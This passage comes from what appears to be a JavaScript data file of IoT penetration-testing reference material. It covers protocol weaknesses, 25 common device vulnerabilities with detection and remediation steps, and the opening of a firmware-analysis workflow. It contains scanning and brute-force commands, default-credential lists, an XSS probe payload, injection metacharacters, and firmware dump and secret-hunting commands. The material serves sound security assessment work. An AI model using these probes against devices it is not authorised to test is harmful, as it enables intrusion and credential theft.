      "Browse address space for sensitive nodes",
      "Test authentication: anonymous, username/password, certificate"
    ]
  },
  {
    name: "XMPP (Extensible Messaging and Presence Protocol)",
    port: 5222,
    description: "XML-based messaging protocol used in some IoT deployments for device communication and presence management. Provides publish-subscribe, multi-party chat, and federation capabilities. Used by some IoT platforms for real-time device messaging and control.",
    vulnerabilities: [
      "Cleartext authentication before STARTTLS upgrade",
      "DNS-based server discovery enables MitM via DNS spoofing",
      "Roster information disclosure revealing device topology",
      "Federation allows messages from external domains if not restricted",
      "PubSub node access control misconfiguration",
      "XML entity injection in message payloads",
      "Resource exhaustion via connection flooding or large stanza payloads"
    ],
    testing: [
      "nmap -p 5222,5269,5280 <target>                      # XMPP port discovery",
      "xmpp-client tools for protocol interaction",
      "Test STARTTLS enforcement and certificate validation",
      "Enumerate roster and PubSub nodes",
      "Test federation policies from external domain",
      "Check admin interface (port 5280 for HTTP admin)",
      "Verify XML entity handling in message processing"
    ]
  },
  {
    name: "LwM2M (Lightweight M2M)",
    port: 5683,
    description: "Device management protocol built on CoAP, designed for constrained IoT devices. Standardized by OMA SpecWorks for remote device management, service enablement, and application data delivery. Uses a client-server model with Bootstrap, Registration, Device Management, and Information Reporting interfaces.",
    vulnerabilities: [
      "Bootstrap process can be hijacked to redirect device to rogue server",
      "DTLS optional and often not implemented on constrained devices",
      "Firmware update mechanism can be abused to push malicious firmware",
      "Object/resource access control weaknesses",
      "Device registration manipulation to impersonate managed devices",
      "Observation notification spoofing",
      "Pre-shared key management weaknesses in PSK-based DTLS"
    ],
    testing: [
      "Leshan (Eclipse LwM2M) server for testing LwM2M interactions",
      "coap-client for raw CoAP requests to LwM2M endpoints",
      "Test bootstrap process security",
      "Verify DTLS implementation and cipher suite configuration",
      "Test firmware update path security",
      "Enumerate accessible objects and resources",
      "Verify access control on management operations"
    ]
  },
  {
    name: "DDS (Data Distribution Service)",
    port: 7400,
    description: "Data-centric publish-subscribe middleware used in autonomous vehicles, robotics, military systems, and industrial IoT. Supports real-time communication with QoS policies. Discovery uses RTPS (Real-Time Publish-Subscribe) protocol over multicast.",
    vulnerabilities: [
      "Multicast discovery exposes all topics and participants",
      "No authentication in default DDS configuration",
      "DDS Security specification is optional and rarely implemented",
      "Topic data accessible to any participant on the network",
      "Governance and permissions document manipulation",
      "QoS policy abuse for denial of service",
      "Participant impersonation through GUID spoofing"
    ],
    testing: [
      "rtps_sniffer for RTPS protocol discovery and capture",
      "dds-security-audit for DDS configuration assessment",
      "Wireshark RTPS dissector for protocol analysis",
      "Join DDS domain as participant and enumerate topics",
      "Test data access without authentication",
      "Verify DDS Security plugin deployment"
    ]
  },
  {
    name: "KNX (Konnex)",
    port: 3671,
    description: "Building automation protocol for smart home and building control (lighting, HVAC, shading, security). KNXnet/IP provides IP connectivity to the KNX bus. Commonly used in European commercial and residential buildings. Supports tunneling and routing modes.",
    vulnerabilities: [
      "No authentication in KNXnet/IP by default (KNX Secure is optional)",
      "Device discovery via search request broadcast",
      "Unauthorized read/write of group addresses controlling building systems",
      "Programming mode allows device reconfiguration without authentication",
      "Tunneling connection hijacking",
      "Bus monitor mode reveals all building automation traffic",
      "Denial of service via flooding or malformed telegrams"
    ],
    testing: [
      "nmap -p 3671 -sU --script knx-gateway-discover <target>",
      "ETS (Engineering Tool Software) for KNX interaction",
      "knxmap for KNX device discovery and interaction",
      "calimero (Java library) for KNX protocol access",
      "Test group address read/write without authentication",
      "Scan for devices in programming mode",
      "Enumerate group addresses and data points"
    ]
  },
  {
    name: "Thread / Matter",
    port: null,
    description: "Thread is an IPv6-based mesh networking protocol for IoT devices using IEEE 802.15.4 radio. Matter (formerly Project CHIP) is an application-layer protocol running over Thread, Wi-Fi, and Ethernet for smart home interoperability. Both prioritize security with mandatory encryption.",
    vulnerabilities: [
      "Commissioner credential theft during device commissioning",
      "Thread network key exposure enables eavesdropping on all mesh traffic",
      "Side-channel attacks on DTLS handshake during commissioning",
      "Matter device attestation certificate chain weaknesses",
      "Denial of service against Thread border router",
      "Mesh routing manipulation via malicious router advertisements",
      "QR code / NFC commissioning data interception"
    ],
    testing: [
      "OpenThread for Thread protocol testing and analysis",
      "chip-tool (Matter SDK) for Matter device commissioning and control",
      "Thread Group test harness for conformance testing",
      "Wireshark with Thread dissector for traffic analysis",
      "Test commissioning security with sniffing hardware",
      "Verify device attestation certificate chain",
      "Test mesh network resilience to router removal/addition"
    ]
  },
  {
    name: "6LoWPAN (IPv6 over Low-Power WPANs)",
    port: null,
    description: "Adaptation layer enabling IPv6 over IEEE 802.15.4 networks, commonly used in IoT sensor networks. Provides header compression, fragmentation, and mesh addressing. Forms the network layer for protocols like Thread and ZigBee IP.",
    vulnerabilities: [
      "Fragmentation attacks exploiting reassembly buffer on constrained devices",
      "Routing attacks on RPL (Routing Protocol for Low-Power Networks)",
      "Sinkhole attacks directing all traffic through malicious node",
      "Selective forwarding by compromised mesh nodes",
      "Wormhole attacks creating false shortcuts in the mesh topology",
      "Sybil attacks with multiple fake identities in the mesh",
      "Resource exhaustion on border routers through excessive fragmentation"
    ],
    testing: [
      "Contiki-NG or RIOT OS for 6LoWPAN node emulation",
      "Foren6 for 6LoWPAN network visualization and analysis",
      "Wireshark with 6LoWPAN and RPL dissectors",
      "Custom tools with IEEE 802.15.4 compatible hardware",
      "Test fragmentation handling on target devices",
      "Analyze RPL DODAG topology for manipulation vulnerabilities",
      "Verify link-layer security (IEEE 802.15.4 AES-CCM*)"
    ]
  },
  {
    name: "RTSP (Real Time Streaming Protocol)",
    port: 554,
    description: "Network protocol for controlling streaming media servers, widely used in IP cameras, NVRs, and surveillance systems. Provides VCR-like control commands (PLAY, PAUSE, SETUP, TEARDOWN). Often paired with RTP/RTCP for actual media transport.",
    vulnerabilities: [
      "Default credentials on IP cameras (admin/admin, admin/12345)",
      "Cleartext authentication in basic RTSP authentication",
      "Unauthenticated stream access on misconfigured cameras",
      "Buffer overflow vulnerabilities in RTSP parsers",
      "RTSP URL brute-forcing to discover hidden streams",
      "Lack of encryption on video streams enabling eavesdropping",
      "ONVIF device management protocol weaknesses alongside RTSP"
    ],
    testing: [
      "nmap -p 554 --script rtsp-url-brute <target>         # URL brute force",
      "ffplay rtsp://<target>:554/stream                     # Test stream access",
      "cameradar -t <target>                                 # RTSP vulnerability scanner",
      "onvif-tool for ONVIF device discovery and management",
      "Test default credentials from common IP camera credential lists",
      "Check for unauthenticated stream paths (/live, /stream, /media)",
      "Verify RTSP digest authentication implementation"
    ]
  },
  {
    name: "UPnP / SSDP",
    port: 1900,
    description: "Universal Plug and Play protocol suite using SSDP (Simple Service Discovery Protocol) over UDP multicast for device discovery. Enables automatic network configuration and service advertisement. Widely implemented in consumer IoT devices, routers, and media devices.",
    vulnerabilities: [
      "SSDP reflection/amplification for DDoS attacks",
      "Unauthorized device control through SOAP action invocation",
      "XML external entity (XXE) injection in device description parsing",
      "Port mapping manipulation via IGD (Internet Gateway Device) control",
      "Sensitive information disclosure in device descriptions",
      "Callback header injection in SUBSCRIBE requests",
      "No authentication for device control actions"
    ],
    testing: [
      "nmap -p 1900 -sU --script upnp-info <target>         # UPnP discovery",
      "miranda (UPnP testing framework) for device enumeration",
      "gssdp-discover for SSDP device discovery",
      "upnp-inspector for UPnP device interaction",
      "Test IGD port mapping: create, list, delete mappings",
      "Check for external-facing UPnP services",
      "Test XML parsing for XXE vulnerabilities"
    ]
  }
];

// ---------------------------------------------------------------------------
// 5. IOT_COMMON_VULNS — 25 common IoT vulnerabilities
// ---------------------------------------------------------------------------

const IOT_COMMON_VULNS = [
  {
    name: "Default Credentials",
    description: "Devices ship with factory-default usernames and passwords that are publicly documented and rarely changed by end users. Default credentials are the single most exploited IoT vulnerability, enabling mass compromise through automated scanning (Mirai botnet and derivatives).",
    detection: [
      "Attempt login with manufacturer default credentials from documentation",
      "Check common defaults: admin/admin, admin/password, root/root, admin/1234",
      "Use default credential databases: cirt.net, routerpasswords.com",
      "Automated scanning with tools like Medusa, Hydra, or Ncrack",
      "Firmware analysis to extract hardcoded default credentials"
    ],
    remediation: [
      "Force password change during initial device setup",
      "Generate unique per-device credentials at manufacturing time",
      "Implement account lockout after failed login attempts",
      "Support integration with centralized authentication (LDAP, RADIUS)",
      "Disable or rename default administrative accounts"
    ],
    severity: "Critical"
  },
  {
    name: "UART Debug Interface Exposure",
    description: "Universal Asynchronous Receiver-Transmitter (UART) debug ports left accessible on production devices. UART typically provides a serial console with root shell access, bootloader interaction, and debug logging. Requires only physical access and a USB-to-UART adapter.",
    detection: [
      "Visual inspection of PCB for labeled UART pins (TX, RX, GND, VCC)",
      "Use multimeter to identify TX pin (fluctuating voltage during boot)",
      "Logic analyzer to determine baud rate (common: 9600, 115200)",
      "JTAGulator for automated pin identification",
      "Attempt connection: screen /dev/ttyUSB0 115200"
    ],
    remediation: [
      "Disable UART in production firmware",
      "Remove or depopulate UART headers from production PCBs",
      "Require authentication on serial console access",
      "Disable bootloader serial access or require secure boot password",
      "Encrypt sensitive data displayed in boot logs"
    ],
    severity: "High"
  },
  {
    name: "JTAG/SWD Debug Interface Exposure",
    description: "Joint Test Action Group (JTAG) or Serial Wire Debug (SWD) interfaces left enabled on production devices. These hardware debug interfaces allow full memory read/write, firmware extraction, real-time debugging, and bypass of software security controls.",
    detection: [
      "Visual inspection for JTAG header (10-pin, 20-pin, or custom)",
      "JTAGulator for automated pin identification and IDCODE scan",
      "OpenOCD for JTAG/SWD connection testing",
      "Check for standard JTAG pinouts in device documentation",
      "Use multimeter to trace PCB traces from MCU debug pins to headers"
    ],
    remediation: [
      "Disable JTAG/SWD via fuse bits in production firmware",
      "Enable read protection on flash memory (RDP level 2 on STM32)",
      "Remove debug headers from production PCB layout",
      "Implement secure debug authentication (ARM TrustZone CryptoCell)",
      "Use tamper detection to erase keys when debug access is attempted"
    ],
    severity: "High"
  },
  {
    name: "Firmware Extraction and Reverse Engineering",
    description: "Device firmware can be extracted through debug interfaces (JTAG/SWD/UART), SPI flash chip reading, or over-the-air update interception. Extracted firmware reveals hardcoded secrets, encryption keys, API endpoints, and vulnerability patterns.",
    detection: [
      "Attempt firmware download from manufacturer website or update server",
      "Read SPI/NAND flash directly using programmer: flashrom -p ch341a_spi -r firmware.bin",
      "Extract via JTAG memory dump: openocd -f target.cfg -c 'dump_image firmware.bin 0x08000000 0x100000'",
      "Intercept OTA update traffic to capture firmware image",
      "Check for unencrypted firmware on device file system"
    ],
    remediation: [
      "Encrypt firmware images with authenticated encryption (AES-GCM)",
      "Implement secure boot with hardware root of trust",
      "Disable external flash chip read access in production",
      "Use code obfuscation and anti-tampering measures",
      "Implement firmware integrity verification at boot"
    ],
    severity: "High"
  },
  {
    name: "Hardcoded Encryption Keys",
    description: "Cryptographic keys, API keys, certificates, and tokens embedded directly in firmware or application code. Once extracted from a single device, these shared secrets compromise all devices of the same model, as the same key is typically used across the entire product line.",
    detection: [
      "Firmware string analysis: strings firmware.bin | grep -i 'key\\|secret\\|password\\|token'",
      "Entropy analysis to locate encrypted or compressed regions: binwalk -E firmware.bin",
      "Search for common key formats: PEM, DER, JWK, base64-encoded blocks",
      "Decompile firmware and search for cryptographic library calls",
      "Use tools like FACT (Firmware Analysis and Comparison Tool)"
    ],
    remediation: [
      "Generate unique per-device keys during manufacturing provisioning",
      "Store keys in hardware security elements (TPM, secure enclave, PUF)",
      "Use key derivation from device-unique values rather than static keys",
      "Implement secure key storage APIs and never hardcode secrets",
      "Rotate shared secrets regularly if per-device provisioning is not feasible"
    ],
    severity: "Critical"
  },
  {
    name: "Insecure Firmware Update Mechanism",
    description: "Over-the-air (OTA) or local firmware update processes that lack proper cryptographic verification. Allows attackers to push modified firmware containing backdoors, malware, or configuration changes. Common issues include unsigned updates, HTTP transport, and missing rollback protection.",
    detection: [
      "Intercept firmware update traffic with proxy (Burp Suite, mitmproxy)",
      "Check if updates are served over HTTP vs HTTPS",
      "Verify whether firmware signature is checked before installation",
      "Attempt to push modified firmware image to device",
      "Check for firmware downgrade (rollback) protection",
      "Analyze update client code for signature verification logic"
    ],
    remediation: [
      "Sign all firmware images with asymmetric cryptography (ECDSA, EdDSA)",
      "Verify firmware signature in bootloader before execution",
      "Use TLS for firmware download transport",
      "Implement anti-rollback counters in secure storage",
      "Implement A/B partitioning for safe update failure recovery",
      "Verify firmware integrity on every boot (not just update)"
    ],
    severity: "Critical"
  },
  {
    name: "Plaintext Communication Protocols",
    description: "IoT devices communicating over unencrypted protocols (HTTP, MQTT without TLS, Telnet, FTP, Modbus TCP), exposing sensitive data including credentials, telemetry, commands, and personal information to network eavesdroppers.",
    detection: [
      "Network traffic capture with Wireshark or tcpdump",
      "nmap service scanning to identify unencrypted protocol versions",
      "Check for TLS/DTLS negotiation on IoT protocol ports",
      "Analyze traffic for cleartext credentials or sensitive data",
      "Test whether devices accept connections without encryption"
    ],
    remediation: [
      "Enable TLS/DTLS on all communication channels",
      "Disable legacy unencrypted protocol support",
      "Use certificate-based mutual TLS for device authentication",
      "Implement application-layer encryption for protocols lacking TLS support",
      "Deploy network segmentation to limit exposure of plaintext traffic"
    ],
    severity: "High"
  },
  {
    name: "Lack of Secure Boot",
    description: "Devices that do not verify the integrity and authenticity of firmware before execution. Without secure boot, an attacker with physical or firmware update access can replace the firmware with a malicious version that persists across reboots.",
    detection: [
      "Check if bootloader verifies firmware signature before loading",
      "Modify a single byte in firmware image and attempt to boot",
      "Check for hardware root of trust (ROM bootloader, secure element)",
      "Review bootloader source or binary for signature verification code",
      "Test whether debug interfaces allow unsigned code execution"
    ],
    remediation: [
      "Implement hardware-rooted secure boot chain (ROM -> bootloader -> OS -> apps)",
      "Use asymmetric cryptography for firmware signature verification",
      "Store public verification key in one-time-programmable fuses",
      "Implement measured boot with TPM or equivalent attestation",
      "Protect bootloader from modification via write-protect mechanisms"
    ],
    severity: "High"
  },
  {
    name: "Insufficient Network Segmentation",
    description: "IoT devices placed on the same network segment as critical IT infrastructure, allowing compromised IoT devices to pivot to high-value targets. Flat network architectures provide no containment when an IoT device is compromised.",
    detection: [
      "Network topology mapping from IoT device perspective",
      "Attempt to reach IT infrastructure from IoT VLAN",
      "Check for VLAN segregation between IoT and corporate networks",
      "Test firewall rules between IoT and other network segments",
      "Verify that IoT devices cannot access management interfaces of other systems"
    ],
    remediation: [
      "Deploy dedicated IoT VLANs with strict firewall rules",
      "Implement micro-segmentation for critical IoT device groups",
      "Use network access control (NAC) to classify and segment IoT devices",
      "Block IoT-to-IoT lateral movement where not required",
      "Monitor east-west traffic for anomalous IoT communication patterns"
    ],
    severity: "High"
  },
  {
    name: "Weak or Missing Authentication",
    description: "IoT devices and their management APIs lack proper authentication mechanisms, relying on obscurity (unpublished API endpoints), basic authentication over cleartext, or single-factor authentication without account lockout.",
    detection: [
      "Test API endpoints without authentication headers",
      "Attempt access with empty or null credentials",
      "Check for authentication bypass via parameter manipulation",
      "Test for API key exposure in client-side code or firmware",
      "Verify session management and token expiration"
    ],
    remediation: [
      "Implement strong authentication on all device interfaces",
      "Use mutual TLS for device-to-cloud authentication",
      "Support multi-factor authentication for administrative access",
      "Implement OAuth 2.0 or equivalent for API authentication",
      "Use device certificates provisioned during manufacturing for machine identity"
    ],
    severity: "Critical"
  },
  {
    name: "Exposed Management Interfaces",
    description: "Device management interfaces (web admin panels, SSH, Telnet, SNMP) exposed to untrusted networks or the internet. Management interfaces often have weaker security controls and provide privileged access to device configuration and operation.",
    detection: [
      "Port scan for common management ports: 22, 23, 80, 443, 161, 8080, 8443",
      "Search Shodan/Censys for exposed device management interfaces",
      "Check if management interface is accessible from non-management VLANs",
      "Test for management interface access via IPv6 when IPv4 is restricted",
      "Verify management interface is not accessible from guest/IoT networks"
    ],
    remediation: [
      "Restrict management interfaces to dedicated management VLAN",
      "Implement firewall rules limiting management access to authorized IPs",
      "Disable unused management protocols (Telnet, SNMP v1/v2c, HTTP)",
      "Use VPN or jump host for remote management access",
      "Implement role-based access control on management interfaces"
    ],
    severity: "High"
  },
  {
    name: "Unencrypted Data Storage",
    description: "Sensitive data stored in plaintext on device flash memory, SD cards, or EEPROM. This includes Wi-Fi credentials, API tokens, user data, encryption keys, and configuration files that can be extracted through physical access or firmware dump.",
    detection: [
      "Extract and mount device filesystem (binwalk, dd, mount)",
      "Search for plaintext credentials in configuration files",
      "Analyze NVRAM/EEPROM dumps for sensitive data",
      "Check if encryption keys are stored alongside encrypted data",
      "Review filesystem permissions on sensitive files"
    ],
    remediation: [
      "Encrypt sensitive data at rest using hardware-backed key storage",
      "Use secure elements or TPM for credential storage",
      "Implement filesystem encryption on storage media",
      "Never store plaintext passwords (use salted hashes for local auth)",
      "Implement secure deletion of temporary sensitive data"
    ],
    severity: "High"
  },
  {
    name: "Command Injection",
    description: "IoT device web interfaces and APIs that pass user input directly to system shell commands without sanitization. Common in devices running embedded Linux with CGI-based web interfaces or custom management daemons.",
    detection: [
      "Test input fields with shell metacharacters: ; | ` $() && ||",
      "Inject sleep-based payloads to detect blind command injection",
      "Test HTTP parameters, headers, and cookie values",
      "Analyze firmware CGI scripts for system() or popen() calls",
      "Check SNMP community string handling for injection"
    ],
    remediation: [
      "Use parameterized system calls instead of shell command strings",
      "Implement strict input validation and whitelist acceptable characters",
      "Run web interface processes with minimal privileges",
      "Use language-specific safe command execution functions",
      "Implement WAF or input filtering at the application layer"
    ],
    severity: "Critical"
  },
  {
    name: "Buffer Overflow in Embedded Services",
    description: "Memory corruption vulnerabilities in IoT device services (web servers, protocol handlers, media processors) running on embedded systems that often lack ASLR, stack canaries, or other memory protections. Exploitable for remote code execution or denial of service.",
    detection: [
      "Fuzz network services with tools like Boofuzz or AFL",
      "Send oversized inputs to all protocol handlers",
      "Analyze firmware binaries for unsafe functions: gets, strcpy, sprintf, scanf",
      "Check binary protections: checksec --file=binary (NX, PIE, canaries)",
      "Monitor device for crashes during fuzzing (watchdog resets, serial console errors)"
    ],
    remediation: [
      "Use memory-safe languages (Rust, Go) for new development",
      "Enable compiler protections: stack canaries, ASLR, NX/DEP, FORTIFY_SOURCE",
      "Replace unsafe C string functions with bounded alternatives (strncpy, snprintf)",
      "Implement input length validation before processing",
      "Deploy address space layout randomization where supported by hardware"
    ],
    severity: "Critical"
  },
  {
    name: "Insecure API Endpoints",
    description: "Cloud APIs used by IoT devices that have vulnerabilities including broken object-level authorization (IDOR), mass assignment, excessive data exposure, rate limiting failures, and injection flaws. Compromising the cloud API often compromises all connected devices.",
    detection: [
      "Intercept device-to-cloud API traffic with proxy",
      "Test for IDOR by modifying device/user identifiers in requests",
      "Check for excessive data in API responses (data leak)",
      "Test rate limiting on authentication and sensitive endpoints",
      "Analyze API documentation (Swagger/OpenAPI) for security gaps"
    ],
    remediation: [
      "Implement proper object-level authorization checks",
      "Use API gateway with rate limiting and threat protection",
      "Minimize data in API responses (principle of least privilege)",
      "Implement API versioning and deprecation policies",
      "Use mutual TLS for device-to-cloud API authentication"
    ],
    severity: "High"
  },
  {
    name: "Lack of Physical Security",
    description: "IoT devices deployed in physically accessible locations without tamper detection or protection. Allows extraction of firmware, debug interface access, chip-off attacks, side-channel analysis, and hardware modification.",
    detection: [
      "Assess physical accessibility of deployed devices",
      "Check for tamper-evident seals or enclosure intrusion detection",
      "Evaluate ease of PCB access and component identification",
      "Test for exposed debug interfaces after opening enclosure",
      "Assess feasibility of chip-off attacks on flash memory"
    ],
    remediation: [
      "Implement tamper detection with key zeroization on tamper event",
      "Use BGA packages and epoxy potting to hinder chip access",
      "Disable debug interfaces via hardware fuses in production",
      "Implement secure boot to prevent execution of modified firmware",
      "Use secure elements for sensitive key storage"
    ],
    severity: "Medium"
  },
  {
    name: "Cross-Site Scripting (XSS) in Web Interfaces",
    description: "IoT device web administration interfaces vulnerable to stored or reflected XSS attacks. Because IoT web servers often lack security headers and proper output encoding, XSS can lead to credential theft, device reconfiguration, or firmware manipulation.",
    detection: [
      "Test all input fields with XSS payloads: <script>alert(1)</script>",
      "Check for reflected XSS in URL parameters and error messages",
      "Test stored XSS in device name, SSID, and configuration fields",
      "Verify Content-Security-Policy and X-XSS-Protection headers",
      "Use automated scanner: XSStrike, dalfox on device web interface"
    ],
    remediation: [
      "Implement proper output encoding for all user-supplied data",
      "Set Content-Security-Policy headers restricting inline scripts",
      "Use HTTPOnly and Secure flags on session cookies",
      "Implement input validation and sanitization",
      "Use templating engines with automatic escaping"
    ],
    severity: "Medium"
  },
  {
    name: "Insecure Bootloader",
    description: "Device bootloader that allows unsigned firmware loading, does not lock flash memory, permits boot sequence interruption, or exposes sensitive bootloader commands. Compromised bootloaders enable persistent device compromise that survives firmware updates.",
    detection: [
      "Interrupt boot sequence via UART (press key during countdown)",
      "Check for U-Boot autoboot delay: setenv bootdelay 10",
      "Test bootloader environment variable modification",
      "Attempt to boot from alternative sources (TFTP, USB, SD card)",
      "Check if bootloader allows firmware flash without verification"
    ],
    remediation: [
      "Implement secure boot with hardware root of trust",
      "Lock bootloader to prevent environment modification",
      "Set bootdelay to 0 or -1 in production U-Boot",
      "Password-protect bootloader interactive mode",
      "Disable alternative boot sources in production"
    ],
    severity: "High"
  },
  {
    name: "Inadequate Logging and Monitoring",
    description: "IoT devices that generate no security-relevant logs or lack the capability to forward logs to centralized monitoring. Without logging, compromises go undetected and forensic investigation after incidents is impossible.",
    detection: [
      "Check if device generates any security event logs",
      "Verify log storage capacity and rotation policy",
      "Test whether failed authentication attempts are logged",
      "Check for syslog or SNMP trap forwarding capability",
      "Verify log integrity protection against tampering"
    ],
    remediation: [
      "Implement logging of authentication events, configuration changes, and errors",
      "Forward logs to centralized SIEM via syslog or MQTT",
      "Include timestamps synchronized via NTP in all log entries",
      "Protect log integrity with cryptographic signing or append-only storage",
      "Implement alerting for critical security events"
    ],
    severity: "Medium"
  },
  {
    name: "DNS Rebinding Against IoT Devices",
    description: "Attack where a malicious website manipulates DNS resolution to bypass same-origin policy and access IoT devices on the local network. The attacker's domain initially resolves to the attacker's server, then rebinds to the target device's local IP, allowing JavaScript to interact with the device's web interface.",
    detection: [
      "Test device web interface for Host header validation",
      "Check if device accepts requests with non-matching Host headers",
      "Verify CORS headers on device API endpoints",
      "Test with DNS rebinding tools: singularity, dnsrebind",
      "Check if device web server validates Origin header"
    ],
    remediation: [
      "Validate Host header against expected device hostname/IP",
      "Implement strict CORS policy on device web interfaces",
      "Require authentication tokens that cannot be obtained via DNS rebinding",
      "Use HTTPS with proper certificate validation on device web interface",
      "Implement CSRF tokens on all state-changing requests"
    ],
    severity: "Medium"
  },
  {
    name: "Side-Channel Attacks (Power/Timing/EM)",
    description: "Extract cryptographic keys and other secrets by measuring physical characteristics of device operation: power consumption (DPA/SPA), electromagnetic emissions, execution timing, or acoustic emanations. Particularly effective against IoT devices with limited countermeasures.",
    detection: [
      "Power analysis: connect current probe to device power supply during crypto operations",
      "Timing analysis: measure response times for different inputs",
      "EM analysis: use near-field probe during cryptographic operations",
      "Use ChipWhisperer or similar platform for automated analysis",
      "Statistical analysis of measurements to extract key bits"
    ],
    remediation: [
      "Use constant-time cryptographic implementations",
      "Add random delays and dummy operations to mask power patterns",
      "Implement power supply filtering and decoupling",
      "Use hardware crypto accelerators with built-in side-channel protections",
      "Deploy EM shielding on sensitive components"
    ],
    severity: "Medium"
  },
  {
    name: "Insecure Direct Object Reference (IDOR) in Device Cloud",
    description: "IoT cloud platforms that use predictable or enumerable identifiers (device serial numbers, sequential IDs) to reference devices, allowing an authenticated user to access or control other users' devices by manipulating the identifier.",
    detection: [
      "Intercept API requests between device app and cloud platform",
      "Identify device identifier format (serial number, UUID, sequential ID)",
      "Modify device identifier in API requests to access other devices",
      "Test both read (telemetry, status) and write (commands, config) endpoints",
      "Check for authorization enforcement beyond authentication"
    ],
    remediation: [
      "Implement proper authorization checks on all device access",
      "Use cryptographically random device identifiers (UUIDv4)",
      "Verify device ownership on every API request",
      "Implement device-user binding that is checked server-side",
      "Log and alert on unauthorized cross-device access attempts"
    ],
    severity: "Critical"
  },
  {
    name: "Bluetooth Pairing Vulnerability (Legacy PIN)",
    description: "IoT devices using Bluetooth Legacy Pairing with fixed or short PINs (commonly 0000 or 1234). The legacy pairing mechanism generates the link key from the PIN, which can be brute-forced offline from captured pairing traffic if the PIN is short.",
    detection: [
      "Check device documentation for pairing PIN requirements",
      "Sniff pairing exchange with Ubertooth or HCI sniffer",
      "Attempt pairing with common default PINs: 0000, 1234, 1111",
      "Check if device uses Secure Simple Pairing or Legacy Pairing",
      "Verify if Numeric Comparison or Passkey Entry is actually enforced"
    ],
    remediation: [
      "Use Bluetooth Secure Simple Pairing with Numeric Comparison",
      "Upgrade to BLE Secure Connections (LESC) with ECDH",
      "Implement out-of-band (OOB) pairing for high-security applications",
      "Use random, per-pairing PINs displayed on device if possible",
      "Require user confirmation for all pairing attempts"
    ],
    severity: "High"
  },
  {
    name: "Supply Chain Firmware Tampering",
    description: "Malicious modification of firmware during manufacturing, distribution, or storage. Backdoored firmware may be indistinguishable from legitimate firmware without cryptographic verification. Affects device trust from the moment of deployment.",
    detection: [
      "Compare firmware hash against manufacturer-published checksum",
      "Analyze firmware for unexpected network connections or services",
      "Check for additional user accounts or modified authentication logic",
      "Compare binary diff between device firmware and known-good reference",
      "Verify code signing certificate chain back to manufacturer root"
    ],
    remediation: [
      "Implement secure boot with hardware root of trust verifying firmware at every boot",
      "Publish firmware checksums via authenticated channel (signed manifest)",
      "Use hardware security modules (HSM) for firmware signing in CI/CD",
      "Implement supply chain attestation and provenance tracking",
      "Perform periodic firmware integrity verification on deployed devices"
    ],
    severity: "Critical"
  },
  {
    name: "Exposed SPI/I2C/SPI Flash Chips",
    description: "Flash memory chips on IoT device PCBs that can be directly read using inexpensive programming tools. SPI NOR flash, NAND flash, and EEPROM chips are commonly used for firmware and configuration storage and can be accessed with clip-on probes without desoldering.",
    detection: [
      "Identify flash chips on PCB by markings and package type",
      "Check if chip supports in-circuit reading via SPI/I2C bus",
      "Attempt read with clip-on probe: flashrom -p ch341a_spi -r dump.bin",
      "Check if flash contents are encrypted",
      "Verify if write-protect pin is properly configured"
    ],
    remediation: [
      "Encrypt firmware and data stored on external flash",
      "Use MCU internal flash with read-protection fuses enabled",
      "Enable write-protect pin on flash chips in production",
      "Implement encrypted filesystem on external storage",
      "Use BGA packages to hinder physical access to flash chips"
    ],
    severity: "Medium"
  }
];

// ---------------------------------------------------------------------------
// 6. FIRMWARE_ANALYSIS — 15 firmware analysis steps
// ---------------------------------------------------------------------------

const FIRMWARE_ANALYSIS = [
  {
    step: "Firmware Acquisition",
    description: "Obtain the firmware image through manufacturer download, OTA update interception, or physical extraction from the device's flash memory. This is the prerequisite for all subsequent analysis steps.",
    tool: "wget / curl / flashrom / openocd / binwalk",
    command: [
      "# Download from manufacturer:",
      "wget https://vendor.com/firmware/device_v1.2.3.bin",
      "",
      "# Read SPI flash in-circuit:",
      "flashrom -p ch341a_spi -r firmware_dump.bin",
      "",
      "# Read via JTAG/SWD with OpenOCD:",
      "openocd -f interface/stlink.cfg -f target/stm32f4x.cfg -c 'init; dump_image firmware.bin 0x08000000 0x100000; exit'",
      "",
      "# Intercept OTA update with mitmproxy:",
      "mitmproxy -p 8080 --ssl-insecure --set block_global=false"
    ]
  },
  {
    step: "Initial Entropy and File Type Analysis",
    description: "Analyze the firmware binary for entropy patterns that reveal compressed, encrypted, or structured regions. High entropy regions suggest compression or encryption, while low entropy indicates plaintext data or code. Identify the overall file type and architecture.",
    tool: "binwalk / file / ent",
    command: [
      "# File type identification:",
      "file firmware.bin",
      "",
      "# Entropy analysis (visual):",
      "binwalk -E firmware.bin",
      "",
      "# Calculate overall entropy:",
      "ent firmware.bin",
      "",
      "# Identify architecture and endianness:",
      "binwalk -A firmware.bin",
      "",
      "# Quick hex overview:",
      "xxd firmware.bin | head -100"
    ]
  },
  {
    step: "Firmware Extraction and Unpacking",
    description: "Extract embedded filesystems, compressed archives, and other components from the firmware image using signature-based scanning. Binwalk identifies common headers (squashfs, cramfs, JFFS2, gzip, LZMA, U-Boot) and extracts them automatically.",
    tool: "binwalk / jefferson / sasquatch / ubi_reader",
    command: [
      "# Automated extraction (recursive):",
      "binwalk -eM firmware.bin",
      "",
      "# Extract specific filesystem types:",
      "# SquashFS (may need sasquatch for non-standard compression):",
      "sasquatch -d squashfs_root squashfs.img",
      "",
      "# JFFS2:",
      "jefferson -d jffs2_root jffs2.img",
      "",
      "# UBI/UBIFS:",
      "ubireader_extract_images firmware.bin",
      "ubireader_extract_files ubifs.img",
      "",
      "# CPIO (initramfs):",
      "cpio -idmv < initramfs.cpio"
    ]
  },
  {
    step: "Filesystem Analysis",
    description: "Examine the extracted filesystem for configuration files, scripts, binaries, libraries, and other artifacts that reveal device functionality, security configuration, and potential vulnerabilities.",
    tool: "find / grep / tree / ls",
    command: [
      "# Overview of filesystem structure:",
      "tree -L 3 squashfs-root/",
      "",
      "# Find configuration files:",
      "find squashfs-root/ -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.xml' -o -name '*.yaml'",
      "",
      "# Find web interface files:",
      "find squashfs-root/ -name '*.cgi' -o -name '*.php' -o -name '*.lua' -o -name '*.html'",
      "",
      "# Find startup scripts:",
      "find squashfs-root/ -path '*/init.d/*' -o -path '*/rc.d/*'",
      "",
      "# Check for SSH keys:",
      "find squashfs-root/ -name 'authorized_keys' -o -name 'id_rsa' -o -name '*.pem'",
      "",
      "# List setuid binaries:",
      "find squashfs-root/ -perm -4000 -type f"
    ]
  },
  {
    step: "Credential and Secret Extraction",
    description: "Search the firmware for hardcoded credentials, API keys, encryption keys, certificates, and other sensitive information. These are commonly found in configuration files, environment variables, compiled binaries, and web interface code.",
